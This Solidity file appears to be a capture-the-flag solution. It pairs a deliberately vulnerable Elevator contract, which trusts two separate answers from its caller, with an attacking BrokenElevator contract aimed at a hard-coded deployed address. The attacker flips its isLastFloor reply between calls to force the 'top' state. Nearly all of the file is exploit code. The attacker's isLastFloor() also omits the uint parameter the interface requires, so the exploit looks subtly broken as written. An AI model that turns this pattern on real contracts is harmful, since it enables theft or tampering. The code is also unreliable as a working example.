// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BrokenElevator {

    Elevator level11 = Elevator(0x420B6E0E68E08Fe176FEd57d9283a1E35C7f3Aa3);
    bool public counter = false; // counter variable initially set to false

    function gotoFloor() public {
        level11.goTo(1);
    }

    function isLastFloor() public returns (bool) {
        if (!counter) { // if (true)
            counter = true; // change the counter to true
            return false; // first return value will be false
        } else {
            counter = false; // change the counter to false
            return true; // second return value will be true
        }
    }
}
